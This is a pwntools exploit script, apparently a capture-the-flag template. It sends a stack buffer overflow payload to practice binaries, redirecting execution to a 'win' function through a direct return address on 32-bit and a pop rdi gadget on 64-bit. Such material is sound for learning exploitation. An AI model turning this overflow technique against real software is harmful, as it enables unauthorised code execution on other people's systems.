#!/usr/bin/env python3
from pwn import *

if args.X86:
	exe = ELF("./vuln_x86",checksec=False)
else:
	exe = ELF("./vuln_x64",checksec=False)

context.binary = exe
context.terminal = ['tmux','splitw']

def conn():
	if args.REMOTE:
		r = remote("addr",1337)
	else:
		r = process([exe.path])
		if args.GDB:
			gdb.attach(r,gdbscript='''
			b *0x4011be
			b *win+30
			c
			''')
	return r


def main():
	r = conn()
	
	# Data stuff here

	if args.X86: # ******** 32-bit BOF ********
		offset = 28
		payload = flat({
			offset: exe.symbols['win'], # Address to jump to
			offset+4: exe.symbols['main'], # Address that above function will return to
			offset+8: 0x1337babe # Arg 1 (and so on...)
		})
	else: # ******** 64-bit BOF ********
		pop_rdi = 0x4011be
		offset = 24
		payload = flat({
			offset: pop_rdi, # Gadget to do thing
			offset+8: 0x1337babe, # Address to 'pop' into $rdi
			offset+16: exe.symbols['win'] # Address to ret to
		})
	log.info(f"Payload: {payload}")
	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
	main()
